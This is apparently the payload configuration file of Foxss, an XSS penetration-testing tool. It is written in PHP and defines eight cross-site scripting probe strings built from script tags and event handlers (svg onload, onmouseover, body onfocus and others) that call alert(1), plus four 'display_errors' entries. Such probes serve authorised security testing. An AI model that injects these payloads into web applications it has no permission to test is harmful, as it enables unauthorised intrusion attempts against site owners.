<!--//Hey! Help to improve our foxss as contributor //--!>
<!-- https://github.com/akalankauk/Foxss-XSS-Penetration-Testing-Tool !-->
<?php
//config payloads
$hunter1 = ('"><script>alert(1);</script>');
$hunter2 = ('"><svg onload=alert(1)//');
$hunter3 = ('"onmouseover=alert(1)//');
$hunter4 = ('</script><svg onload=alert(1)>');
$hunter5 = ('"><svg onload=alert(1)>');
$hunter6 = ('<body onfocus=alert(1)>');
$hunter7 = ('<audio src onloadstart=alert(1)>');
$hunter8 = ('<form onsubmit=alert(1)><input type=submit>');
$hunter9 = ('display_errors');
$hunter10 = ('display_errors');
$hunter11 = ('display_errors');
$hunter12 = ('display_errors');
?>